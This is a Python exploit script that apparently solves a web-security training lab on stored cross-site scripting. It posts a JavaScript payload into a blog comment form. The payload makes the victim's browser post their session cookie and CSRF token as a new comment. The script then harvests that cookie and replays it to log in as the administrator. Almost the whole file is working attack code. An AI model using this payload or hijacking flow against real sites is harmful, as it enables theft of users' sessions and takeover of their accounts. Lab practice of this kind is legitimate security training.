import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def extract_cookie(html_text):
    session_cookie = re.search(r".+session=([A-Z,a-z,0-9]+)", html_text).group(1)
    return str(session_cookie)


def get_csf(s, url):
    # MAKE URL REQUEST
    r = s.get(url, verify=False, proxies=proxies)
    # PARSE HTML TO EXTRACT CSRF TOKEN
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    return str(csrf_token)


def xss_attack(s, url):
    # DECLARE URLs
    postComment_url = url + '/post/comment'
    postId2_url = url + '/post?postId=2'
    postId1_url = url + '/post?postId=1'

    # DECLARE XSS PAYLOAD

    xss_payload = """<script>
document.body.onload = function() {
    var cookies = document.cookie;
    var csrf = document.getElementsByName("csrf")[0].defaultValue;
    var domain = document.domain;
    var details = {
        'csrf': csrf,
        'postId': 2,
        'comment': cookies,
        'name': 'victim',
        'email': 'victim@victim',
        'website': 'http://hack'
    };
    var formBody = [];
    for (var property in details) {
        var encodedKey = encodeURIComponent(property);
        var encodedValue = encodeURIComponent(details[property]);
        formBody.push(encodedKey + "=" + encodedValue);
    }
    formBody = formBody.join("&");
    fetch("https://"+domain+"/post/comment", {
        method: "POST",
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: formBody
    });
}
</script>
    """
    # DECLARE FORM VALUES
    params = {
        'csrf' : get_csf(s, postId1_url),
        'postId' : 1,
        'comment': xss_payload,
        'name' : 'attacker',
        'email' : 'att@cker',
        'website' : 'http://hack' 
    }

    # POST PAYLOAD AND CHECK FOR ERRORS
    r = s.post(postComment_url, data=params, allow_redirects=False, verify=False, proxies=proxies)
    if r.status_code != 302:
        print("[-] Could not post the payload")
        sys.exit(-1)
    print("[+] Payload upload successful!")

    # EXTRACT SESSION COOKIE FROM POST 2
    r = requests.get(postId2_url, verify=False, proxies=proxies)
    session_cookie = extract_cookie(r.text)
    if not session_cookie:
        print("[-] Session cookie extraction failed! Maybe the payload didn't work...")
        sys.exit(-1)
    print("[+] The session cookie is %s" % session_cookie)

    # USE SESSION COOKIE AND IMPERSONATE VICTIM
    cookies = {
        'session' : session_cookie
    }
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    if '<a href="/my-account?id=administrator">' not in r.text:
        print("[-] Impersonation failed!")
        sys.exit(-1)
    print("[+] Hurray! We are admin!")


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()
    s = requests.Session()
    print("[+] Lab: Exploiting cross-site scripting to steal cookies")
    print("""[+] This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.
    Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.
Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the cookie._""")

    xss_attack(s, url)


if __name__ == "__main__":
    main()